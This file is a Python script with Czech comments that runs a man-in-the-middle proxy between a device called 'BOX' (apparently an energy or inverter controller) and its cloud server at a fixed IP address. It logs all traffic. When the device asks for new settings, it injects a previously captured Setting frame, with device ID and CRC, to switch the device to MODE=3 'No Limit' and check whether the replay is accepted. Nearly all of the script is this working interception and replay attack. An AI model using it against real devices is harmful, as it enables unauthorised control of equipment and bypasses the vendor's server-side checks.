#!/usr/bin/env python3
"""
MITM Test: Replay starého Setting frame na BOX.

Funguje jako transparentní proxy mezi BOX a cloudem.
Vše forwarduje, ALE na IsNewSet injektuje náš starý Setting frame.

Účel: Zjistit jestli BOX validuje čas (DT/TSec) v Setting frame.

Loguje VEŠKEROU komunikaci do souboru pro analýzu.
"""
# pylint: disable=missing-module-docstring,missing-function-docstring,missing-class-docstring,logging-fstring-interpolation,broad-exception-caught,unspecified-encoding,import-outside-toplevel,unused-import,unused-argument,too-many-locals,too-many-statements,too-many-branches,too-many-instance-attributes,f-string-without-interpolation,line-too-long,too-many-nested-blocks,too-many-return-statements,no-else-return,unused-variable,no-else-continue,duplicate-code

import asyncio
import json
import logging
import os
import sys
from datetime import datetime

# Výstupní soubor pro zachycená data
OUTPUT_DIR = "/tmp/mitm_capture"
os.makedirs(OUTPUT_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s.%(msecs)03d [MITM] %(message)s",
    datefmt="%H:%M:%S",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(f"{OUTPUT_DIR}/mitm.log")
    ]
)
logger = logging.getLogger(__name__)

# Cloud server
CLOUD_HOST = "185.25.185.30"
CLOUD_PORT = 5710

# Zachycený validní Setting frame z 7.12.2025 (MODE=3, No Limit)
SETTING_FRAME_MODE3 = (
    '<Frame>'
    '<ID>13584179</ID>'
    '<ID_Device>2206237016</ID_Device>'
    '<ID_Set>1765136481</ID_Set>'
    '<ID_SubD>0</ID_SubD>'
    '<DT>07.12.2025 20:41:21</DT>'
    '<NewValue>3</NewValue>'
    '<Confirm>New</Confirm>'
    '<TblName>tbl_box_prms</TblName>'
    '<TblItem>MODE</TblItem>'
    '<ID_Server>5</ID_Server>'
    '<mytimediff>0</mytimediff>'
    '<Reason>Setting</Reason>'
    '<TSec>2025-12-07 19:47:07</TSec>'
    '<ver>10712</ver>'
    '<CRC>16664</CRC>'
    '</Frame>\r\n'
)

# END frame
END_FRAME = (
    '<Frame><Result>END</Result>'
    '<Time>2025-12-11 15:00:00</Time>'
    '<UTCTime>2025-12-11 14:00:00</UTCTime>'
    '<ToDo>GetActual</ToDo><CRC>28606</CRC></Frame>\r\n'
)


class MITMProxy:
    """MITM proxy - forwarduje vše, injektuje Setting na IsNewSet."""

    def __init__(self, listen_port: int = 5710):
        self.listen_port = listen_port
        self.test_done = False
        self.test_result = None
        self.inject_count = 0  # Kolikrát jsme injektovali
        self.max_inject = 1    # Injektuj jen jednou
        self.frame_counter = 0
        self.captured_frames = []

    def _save_frame(self, direction: str, data: str, frame_type: str = ""):
        """Uloží frame pro pozdější analýzu."""
        self.frame_counter += 1
        ts = datetime.now().isoformat()

        frame_info = {
            "id": self.frame_counter,
            "timestamp": ts,
            "direction": direction,
            "type": frame_type,
            "length": len(data),
            "data": data
        }
        self.captured_frames.append(frame_info)

        # Uložit do souboru průběžně
        filename = f"{OUTPUT_DIR}/frame_{self.frame_counter:04d}_{direction}.xml"
        with open(filename, "w") as f:
            f.write(f"<!-- {ts} | {direction} | {frame_type} -->\n")
            f.write(data)

    def _save_all_frames(self):
        """Uloží všechny zachycené framy do JSON."""
        filename = f"{OUTPUT_DIR}/all_frames.json"
        with open(filename, "w") as f:
            json.dump(self.captured_frames, f, indent=2, ensure_ascii=False)
        logger.info(f"📁 Uloženo {len(self.captured_frames)} framů do {filename}")

    async def handle_box(
        self,
        box_reader: asyncio.StreamReader,
        box_writer: asyncio.StreamWriter
    ):
        """Zpracuje připojení od BOXu."""
        addr = box_writer.get_extra_info('peername')
        logger.info(f"🔌 BOX připojen: {addr}")

        # Připoj se na cloud
        try:
            cloud_reader, cloud_writer = await asyncio.wait_for(
                asyncio.open_connection(CLOUD_HOST, CLOUD_PORT),
                timeout=10.0
            )
            logger.info(f"☁️ Připojeno na cloud: {CLOUD_HOST}:{CLOUD_PORT}")
        except Exception as e:
            logger.error(f"❌ Nelze se připojit na cloud: {e}")
            box_writer.close()
            return

        try:
            # Paralelně forwarduj oba směry
            await asyncio.gather(
                self._forward_box_to_cloud(
                    box_reader, cloud_writer, box_writer
                ),
                self._forward_cloud_to_box(cloud_reader, box_writer),
                return_exceptions=True
            )
        except Exception as e:
            logger.debug(f"Connection ended: {e}")
        finally:
            cloud_writer.close()
            box_writer.close()
            logger.info("🔌 Spojení ukončeno")

    async def _forward_box_to_cloud(
        self,
        box_reader: asyncio.StreamReader,
        cloud_writer: asyncio.StreamWriter,
        box_writer: asyncio.StreamWriter
    ):
        """Forward BOX → Cloud, detekuje IsNewSet a injektuje odpověď."""
        import re

        while True:
            data = await box_reader.read(4096)
            if not data:
                break

            text = data.decode('utf-8', errors='ignore')
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]

            # Parse frame info
            tbl_match = re.search(r'<TblName>([^<]+)</TblName>', text)
            result_match = re.search(r'<Result>([^<]+)</Result>', text)
            reason_match = re.search(r'<Reason>([^<]+)</Reason>', text)

            tbl = tbl_match.group(1) if tbl_match else None
            result = result_match.group(1) if result_match else None
            reason = reason_match.group(1) if reason_match else None

            frame_type = result or tbl or "unknown"

            # Detekce IsNewSet
            is_new_set = result == "IsNewSet"
            is_ack = result == "ACK"
            is_nack = result == "NACK"

            # Loguj VŠECHNO
            logger.info(f"{'='*60}")
            logger.info(f"📥 {ts} BOX → CLOUD")
            logger.info(f"   Type: {frame_type}")
            if reason:
                logger.info(f"   Reason: {reason}")
            logger.info(f"   Length: {len(text)} bytes")
            logger.info(f"   Data: {text[:500]}")
            if len(text) > 500:
                logger.info(f"   ... ({len(text)-500} more bytes)")

            # Uložit frame
            self._save_frame("BOX_to_CLOUD", text, frame_type)

            if is_new_set:
                logger.info(f"   🎯 IsNewSet DETECTED!")

                # Injektujeme jen jednou
                if self.inject_count < self.max_inject:
                    logger.info("=" * 60)
                    logger.info("🚀 INJECTING Setting frame!")
                    logger.info(f"   MODE=3 (No Limit)")
                    logger.info(f"   Original timestamp: 07.12.2025 20:41:21")
                    logger.info(f"   ID_Set: 1765136481")
                    logger.info(f"   CRC: 16664")
                    logger.info("=" * 60)

                    # Pošli Setting frame BOXu
                    box_writer.write(SETTING_FRAME_MODE3.encode('utf-8'))
                    await box_writer.drain()

                    self._save_frame("INJECT_to_BOX", SETTING_FRAME_MODE3,
                                     "Setting_MODE3")
                    logger.info(f"📤 {ts} INJECTED → BOX")
                    logger.info(f"   Data: {SETTING_FRAME_MODE3}")

                    self.inject_count += 1

                    # Čekej na ACK/NACK od BOXu
                    try:
                        response = await asyncio.wait_for(
                            box_reader.read(4096), timeout=10.0
                        )
                        resp_text = response.decode('utf-8', errors='ignore')

                        resp_result = re.search(
                            r'<Result>([^<]+)</Result>', resp_text
                        )
                        resp_reason = re.search(
                            r'<Reason>([^<]+)</Reason>', resp_text
                        )

                        r_result = resp_result.group(1) if resp_result else "?"
                        r_reason = resp_reason.group(1) if resp_reason else "?"

                        logger.info(f"{'='*60}")
                        logger.info(f"📥 {ts} BOX RESPONSE to injection")
                        logger.info(f"   Result: {r_result}")
                        logger.info(f"   Reason: {r_reason}")
                        logger.info(f"   Full: {resp_text}")

                        self._save_frame("BOX_RESPONSE", resp_text,
                                         f"{r_result}_{r_reason}")

                        if r_result == "ACK" and r_reason == "Setting":
                            logger.info("=" * 60)
                            logger.info("✅ ✅ ✅ SUCCESS! ✅ ✅ ✅")
                            logger.info("   BOX ACCEPTED old Setting frame!")
                            logger.info("   → REPLAY WORKS!")
                            logger.info("=" * 60)
                            self.test_result = "SUCCESS"
                        elif r_result == "NACK":
                            logger.info("=" * 60)
                            logger.info("❌ ❌ ❌ REJECTED! ❌ ❌ ❌")
                            logger.info(f"   Reason: {r_reason}")
                            logger.info("=" * 60)
                            self.test_result = f"NACK:{r_reason}"
                        else:
                            logger.info(f"   Unexpected response type")
                            self.test_result = f"UNEXPECTED:{r_result}"

                        # Pošli END frame
                        box_writer.write(END_FRAME.encode('utf-8'))
                        await box_writer.drain()
                        self._save_frame("END_to_BOX", END_FRAME, "END")
                        logger.info(f"📤 {ts} END → BOX")

                        self.test_done = True
                        self._save_all_frames()

                    except asyncio.TimeoutError:
                        logger.warning("⏱️ Timeout waiting for BOX response")
                        self.test_result = "TIMEOUT"
                        self._save_all_frames()

                    continue  # Nepřeposílej IsNewSet na cloud
                else:
                    logger.info(f"   (already injected, forwarding)")

            # Forward na cloud
            cloud_writer.write(data)
            await cloud_writer.drain()
            logger.debug(f"   → Forwarded to cloud")

    async def _forward_cloud_to_box(
        self,
        cloud_reader: asyncio.StreamReader,
        box_writer: asyncio.StreamWriter
    ):
        """Forward Cloud → BOX (transparentně) s logováním."""
        import re

        while True:
            data = await cloud_reader.read(4096)
            if not data:
                break

            text = data.decode('utf-8', errors='ignore')
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]

            # Parse
            result_match = re.search(r'<Result>([^<]+)</Result>', text)
            todo_match = re.search(r'<ToDo>([^<]+)</ToDo>', text)
            crc_match = re.search(r'<CRC>([^<]+)</CRC>', text)

            result = result_match.group(1) if result_match else None
            todo = todo_match.group(1) if todo_match else None
            crc = crc_match.group(1) if crc_match else None

            frame_type = result or "data"

            # Log
            logger.info(f"{'='*60}")
            logger.info(f"📤 {ts} CLOUD → BOX")
            logger.info(f"   Result: {result}")
            logger.info(f"   ToDo: {todo}")
            logger.info(f"   CRC: {crc}")
            logger.info(f"   Length: {len(text)} bytes")
            logger.info(f"   Data: {text}")

            # Uložit frame
            self._save_frame("CLOUD_to_BOX", text, frame_type)

            # Forward na BOX
            box_writer.write(data)
            await box_writer.drain()

    async def run(self, timeout: int = 1200):
        """Spustí MITM proxy."""
        server = await asyncio.start_server(
            self.handle_box, "0.0.0.0", self.listen_port
        )

        logger.info(f"🟢 MITM Proxy na portu {self.listen_port}")
        logger.info(f"   Cloud: {CLOUD_HOST}:{CLOUD_PORT}")
        logger.info(f"   Čekám na BOX... (timeout {timeout}s = {timeout//60} min)")
        logger.info("")
        logger.info("📋 Test: Injekce starého Setting frame na IsNewSet")
        logger.info("")

        try:
            start = asyncio.get_event_loop().time()
            while not self.test_done:
                await asyncio.sleep(1)
                if asyncio.get_event_loop().time() - start > timeout:
                    logger.warning("⏱️ Globální timeout")
                    self.test_result = "TIMEOUT"
                    break
        finally:
            server.close()
            await server.wait_closed()

        logger.info("")
        logger.info("=" * 60)
        logger.info(f"📊 VÝSLEDEK: {self.test_result}")
        logger.info("=" * 60)

        return self.test_result


async def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║  MITM TEST: Replay Setting frame                             ║
╠══════════════════════════════════════════════════════════════╣
║  Proxy forwarduje vše BOX ↔ Cloud                            ║
║  Na IsNewSet injektuje starý Setting frame (07.12.2025)      ║
║                                                              ║
║  ⚠️  Pokud test projde, BOX přepne do MODE=3 (No Limit)!     ║
╚══════════════════════════════════════════════════════════════╝
""")

    proxy = MITMProxy()
    result = await proxy.run(timeout=1200)

    return 0 if result == "SUCCESS" else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
